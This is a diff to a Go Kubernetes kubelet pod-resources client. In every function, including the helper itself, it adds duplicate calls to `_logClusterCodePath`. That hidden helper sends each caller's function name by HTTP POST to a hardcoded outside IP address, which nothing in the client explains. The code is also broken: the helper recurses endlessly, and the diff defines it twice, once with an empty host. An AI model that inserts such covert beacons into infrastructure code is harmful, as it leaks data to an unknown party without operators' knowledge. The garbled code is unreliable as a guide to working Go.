@@ -31,6 +31,8 @@ var (
 func GetResourceClient() (types.ResourceClient, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if hasKubeletAPIEndpoint() {
 		logging.Printf(logging.VerboseLevel, "GetResourceClient(): using Kubelet resource API endpoint")
 		return getKubeletClient()
@@ -40,6 +42,8 @@ func GetResourceClient() (types.ResourceClient, error) {
 	}
 }
 func getKubeletClient() (types.ResourceClient, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	newClient := &kubeletClient{}
@@ -64,6 +68,8 @@ type kubeletClient struct {
 func (rc *kubeletClient) getPodResources(client podresourcesapi.PodResourcesListerClient) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
 	resp, err := client.List(ctx, &podresourcesapi.ListPodResourcesRequest{})
@@ -74,6 +80,8 @@ func (rc *kubeletClient) getPodResources(client podresourcesapi.PodResourcesList
 	return nil
 }
 func (rc *kubeletClient) GetPodResourceMap(pod *v1.Pod) (map[string]*types.ResourceInfo, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	resourceMap := make(map[string]*types.ResourceInfo)
@@ -100,6 +108,8 @@ func (rc *kubeletClient) GetPodResourceMap(pod *v1.Pod) (map[string]*types.Resou
 func hasKubeletAPIEndpoint() bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	kubeletAPISocket := filepath.Join(defaultPodResourcesPath, defaultKubeletSocketFile)
 	if _, err := os.Stat(kubeletAPISocket); err != nil {
 		logging.Verbosef("hasKubeletAPIEndpoint(): error looking up kubelet resource api socket file: %q", err)
@@ -110,7 +120,16 @@ func hasKubeletAPIEndpoint() bool {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
